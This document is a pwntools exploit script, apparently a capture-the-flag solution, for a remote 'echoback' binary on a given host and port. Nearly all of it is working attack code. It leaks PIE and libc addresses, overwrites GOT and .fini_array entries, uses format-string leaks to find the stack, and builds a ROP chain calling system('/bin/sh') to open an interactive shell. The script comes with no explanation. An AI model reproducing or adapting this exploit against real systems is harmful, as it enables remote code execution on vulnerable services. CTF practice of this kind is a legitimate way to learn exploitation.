#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.203.124.220 --port 1236 ./echoback
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./echoback_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.203.124.220'
port = int(args.PORT or 1236)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *0x55555555524c
b *0x55555555525b
c
continue
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc.so.6")

p = b"a"*8*6
p += b"\x90"
io.sendafter(b" : \n",p)

leak = u64(io.recvline()[:-1].ljust(8,b"\x00"))
print(hex(leak))
exe.address = leak - 0x3490
print(hex(exe.address))

to = exe.got['puts']
p = p64(to)
io.sendafter(b" : \n",p)

puts = u64(io.recvline()[:-1].ljust(8,b"\x00"))
print(hex(puts))
libc.address = puts - libc.sym['puts'] # + 0x30
print(hex(libc.address))

print(hex(libc.sym['gets']))
p = p64(libc.sym['gets'])
io.sendafter(b" : \n",p)

sleep(1)
p = p64(libc.sym['printf'])
p += p64(libc.sym['read'])
p += p64(libc.sym['setvbuf'])
p += p64(0)
p += p64(libc.sym['__libc_start_main'])
p += p64(0)*2
p += p64(libc.sym['__cxa_finalize'])
p += p64(0)*3
p += p64(libc.sym['_IO_2_1_stdout_'])
p += p64(0)
p += p64(libc.sym['_IO_2_1_stdin_'])
p += p64(0)
p += p64(libc.sym['_IO_2_1_stderr_'])
p += p64(0)*3
p += b"a"*8*4
p += b"%6$p".ljust(16,b"a")
p += p64(exe.address+0x3490-0x10)
io.sendline(p)

to = exe.address + 0x00000000000031b8
p = b"%6$p".ljust(16,b"a")
p += p64(to)
io.sendafter(b" : ",p)

  # [21] .init_array       INIT_ARRAY       00000000000031b0  000021b0
  # [22] .fini_array       FINI_ARRAY       00000000000031b8  000021b8

p = p64(exe.address + 0x11f2)
io.sendafter(b" : ",p)

p = b"a"*8*4
p += b"%8$p".ljust(16,b"a")
p += b"\x80"
io.sendafter(b" : ",p)

stack = int(io.recvuntil(b"aaaaaaaaaaaa",drop=True),16) - 0x78
print(hex(stack))

p = b"a"*16
p += p64(stack)
io.sendafter(b" : ",p)

p = b"a"*16
p += p64(stack)
io.sendafter(b" : ",p)

p = b"a"*16
p += p64(stack)
io.sendafter(b" : ",p)
pop_rsi = exe.address + 0x00000000000012e1
pop_rdi = exe.address + 0x00000000000012e3
p = p64(pop_rdi)
p += p64(next(libc.search(b"/bin/sh\x00")))
p += p64(pop_rsi)
p += p64(0)*2
p += p64(libc.sym['system'])
io.sendafter(b" : ",p)

io.interactive()

